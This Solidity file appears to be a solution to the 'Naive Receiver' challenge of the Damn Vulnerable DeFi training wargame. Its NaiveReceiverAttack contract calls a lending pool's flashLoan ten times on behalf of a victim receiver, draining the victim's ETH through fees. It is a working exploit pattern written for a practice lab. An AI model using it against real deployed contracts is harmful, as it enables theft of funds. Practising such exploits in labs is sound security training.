// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverAttack {

    address payable private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address payable _pool) {
        pool = _pool;
    }

    function attack(IERC3156FlashBorrower receiver) public {
        for(uint8 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(receiver, ETH, 1, "0x");
        }
    }
}
